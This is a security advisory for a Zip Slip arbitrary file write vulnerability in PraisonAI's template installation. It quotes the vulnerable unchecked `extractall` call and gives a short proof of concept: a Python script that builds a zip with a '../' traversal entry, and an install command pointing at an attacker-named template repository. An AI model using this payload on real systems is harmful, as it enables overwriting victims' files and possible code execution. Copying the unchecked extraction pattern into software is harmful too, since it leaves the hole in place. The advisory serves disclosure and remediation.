# [H] PraisonAI Has Arbitrary File Write (Zip Slip) in Templates Extraction

## Summary
Severity: High
Advisory: GHSA-4ph2-f6pf-79wv
CVE: CVE-2026-39307
CWE: CWE-22, CWE-23
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-04-06
Source: https://github.com/advisories/GHSA-4ph2-f6pf-79wv
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.5.113

## Details
The PraisonAI templates installation feature is vulnerable to a "Zip Slip" Arbitrary File Write attack. When downloading and extracting template archives from external sources (e.g., GitHub), the application uses Python's `zipfile.extractall()` without verifying if the files within the archive resolve outside of the intended extraction directory. 

### Details
Location: `src/praisonai/praisonai/cli/features/templates.py` (Line 852)

Vulnerable Code snippet:
```python
zip_ref.extractall(tmpdir)
```

During installation, the CLI downloads a ZIP archive and extracts it directly into a temporary directory using `zip_ref.extractall(tmpdir)`. A specially crafted ZIP archive can contain file entries with relative paths (such as `../../../../tmp/evil.sh`). If extracting this archive in older Python versions or environments where extraction rules aren't strict, `extractall` will write these files outside the target directory, allowing an attacker to overwrite arbitrary files on the victim's filesystem.

### PoC
1. Generate a malicious zip payload:
```python
import zipfile

with zipfile.ZipFile('malicious_template.zip', 'w') as z:
    # Adding a file that traverses directories
    z.writestr('../../../../../../../tmp/zip_slip_pwned.txt', 'pwned by zip slip')
```
2. Trick a user into installing the malicious template:
```bash
praisonai templates install github:attacker/malicious_template
```
3. Observe the `zip_slip_pwned.txt` file created in `/tmp/` on the victim's machine.

### Impact
This is an Arbitrary File Write vulnerability affecting any user who installs community templates. It can be leveraged to overwrite system files, user dotfiles, or application code, ultimately leading to system corruption or full Remote Code Execution (RCE).

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-4ph2-f6pf-79wv
- https://nvd.nist.gov/vuln/detail/CVE-2026-39307
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.113
